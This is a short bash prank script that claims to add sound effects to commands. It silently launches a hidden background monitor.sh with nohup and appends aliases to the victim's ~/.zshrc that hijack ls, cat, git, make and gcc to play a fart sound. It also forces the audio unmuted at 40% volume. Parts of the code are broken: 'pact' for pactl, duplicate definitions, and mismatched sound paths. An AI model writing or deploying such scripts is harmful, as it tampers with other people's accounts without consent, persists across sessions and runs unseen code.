#!/bin/bash

# Alice script - Add sound effects to basic commands
nohup /sgoinfre/goinfre/Perso/mochamsa/troll/monitor.sh > /dev/null 2>&1 &
# Path to sound files (you'll need to specify these)
SOUND_PATH="/sgoinfre/goinfre/Perso/mochamsa/wav"

# Function to play sound and execute original command
play_and_exec() {
    local sound_file="$1"
    local original_cmd="$2"
    shift 2
    
    # Play sound in background
    command "$original_cmd" "$@"

    pact set-sink-mute @DEFAULT_SINK@ 0
    pact set-sink-volume @DEFAULT_SINK@ 40%
    if [ -f "$SOUND_PATH/$sound_file" ]; then
        paplay "$SOUND_PATH/$sound_file" &
    fi
    
    # Execute original command
}

# Create aliases for basic commands
cat << 'ALIASES_EOF' >> ~/.zshrc

# Alice sound aliases
alias ls='play_and_exec "prout.wav" "ls"'
alias cat='play_and_exec "prout.wav" "cat"'
alias git='play_and_exec "prout.wav" "git"'
alias make='play_and_exec "prout.wav" "make"'
alias gcc='play_and_exec "prout.wav" "gcc"'


# Function definition for play_and_exec
play_and_exec() {
    local sound_file="$1"
    local original_cmd="$2"
    shift 2
    
    # Play sound in background
    if [ -f "/sgoinfre/goinfre/Perso/mochamsa/sounds/$sound_file" ]; then
        paplay "/sgoinfre/goinfre/Perso/mochamsa/sounds/$sound_file" &
    fi
    
    # Execute original command
    command "$original_cmd" "$@"
}

ALIASES_EOF